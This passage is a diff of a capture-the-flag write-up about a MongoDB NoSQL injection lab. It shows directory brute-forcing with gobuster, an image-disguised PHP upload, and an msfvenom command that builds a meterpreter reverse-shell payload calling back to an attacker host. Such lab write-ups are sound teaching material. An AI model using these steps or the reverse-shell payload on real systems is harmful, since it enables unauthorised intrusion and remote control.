@@ -55,6 +55,7 @@ description: "MongoDB NoSQL Injection - A walkthrough of the challenge with enum
 The jpeg header
 
 - Since this Kali machine is closed off from the internet, we can search the machine itself for a jpeg image file:
+
 ```bash
 find / -type f -name "\*.jpeg" 2>/dev/null
 
@@ -79,6 +80,7 @@ As show here:
 ![image12](../resources/26d3d3be75984cdf99a8f9e6ad2e5558.png)
 
 - We can bruteforce for directories to see if we can execute the file (if we uploaded something malicious):
+
 ```bash
 gobuster dir -u http://10.102.114.88 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 
@@ -91,6 +93,7 @@ gobuster dir -u http://10.102.114.88 -w /usr/share/wordlists/seclists/Discovery/
 ![image14](../resources/a3527fc433964ac187cef8147bededf5.png)
 
 - As this didn't lead to anything. I did another scan but with extensions this time:
+
 ```bash
 gobuster dir -u http://10.102.114.88 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x .php
 
@@ -165,6 +168,7 @@ Go to /var/www/html/img/**\<image_name\>**.php.jpg
 - After lots of enumerating - found nothing so to get root I did:
 
 - Created a meterpreter payload:
+
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.102.143.238 LPORT=8881 -f elf -o reverse.elf
 
